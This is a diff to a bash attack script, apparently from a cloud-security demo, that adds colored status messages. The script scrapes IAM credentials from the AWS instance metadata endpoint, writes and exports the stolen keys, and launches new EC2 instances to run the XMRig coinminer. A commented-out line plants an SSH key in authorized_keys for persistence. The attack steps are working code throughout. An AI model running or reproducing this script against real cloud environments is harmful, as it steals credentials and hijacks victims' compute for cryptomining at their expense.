@@ -1,12 +1,29 @@
 #!/bin/bash
 
+# Some variables to make colorized output easier to manage..
+Color_Off='\033[0m'       # Text Resets
+# Regular Colors
+Black='\033[0;30m'        # Black
+Red='\033[0;31m'          # Red
+Green='\033[0;32m'        # Green
+Yellow='\033[0;33m'       # Yellow
+Blue='\033[0;34m'         # Blue
+Purple='\033[0;35m'       # Purple
+Cyan='\033[0;36m'         # Cyan
+White='\033[0;37m'        # White
+
+function yellow_output() {
+    printf "\n${Yellow}$1\n${Color_Off}"
+}
+
 # Scrape credentials from the AWS IMDS service (metadata URL)
+yellow_output "Scraping credentials from the AWS IMDS service..."
 SG_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
 METADATA_TOKEN=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$SG_NAME)
 ACCESS_KEY_ID=$(echo $METADATA_TOKEN | jq -r ".AccessKeyId")
 SECRET_ACCESS_KEY=$(echo $METADATA_TOKEN | jq -r ".SecretAccessKey")
 TOKEN=$(echo $METADATA_TOKEN | jq -r ".Token")
-
+yellow_output "Accessing Instance Identity Document from the AWS IMDS service..."
 INSTANCE_IDENTITY_DOCUMENT=$(curl --silent http://169.254.169.254/latest/dynamic/instance-identity/document)
 ACCT_ID=$(echo $INSTANCE_IDENTITY_DOCUMENT | jq -r ".accountId")
 REGION=$(echo $INSTANCE_IDENTITY_DOCUMENT | jq -r ".region")
@@ -24,6 +41,7 @@ INSTANCE_PROFILE_ARN=$(echo $IAM_INFO | jq -r ".InstanceProfileArn")
 
 
 # Create a new credentials file in /home/$USER
+yellow_output "Creating AWSCLI credentials file..."
 mkdir -p /home/$USER/.aws
 cat << EOF > /home/$USER/.aws/credentials
 [default]
@@ -33,6 +51,7 @@ region = $REGION
 EOF
 
 # OR.. using environment variables
+yellow_output "Exporting AWS Keys/Tokens..."
 export AWS_ACCESS_KEY_ID=$ACCESS_KEY_ID
 export AWS_SECRET_ACCESS_KEY=$SECRET_ACCESS_KEY
 export AWS_SESSION_TOKEN=$TOKEN
@@ -41,6 +60,7 @@ export AWS_SESSION_TOKEN=$TOKEN
 #aws ec2 describe-instances
 
 # Use awscli to create a new EC2 instances to run a coinminer
+yellow_output "Creating new EC2 instance to run XMRig (coinminer)..."
 KEY_NAME=s1
 SG_NAME=SG-s1-wiz
 SG_DESC=SG-s1-wiz
@@ -64,3 +84,4 @@ ec2_run_instances=$(aws ec2 run-instances --image-id $IMAGE_ID --count 1 --insta
 # echo $PUBLIC_KEY >> ~/.ssh/authorized_keys
 
 
+yellow_output "Done."
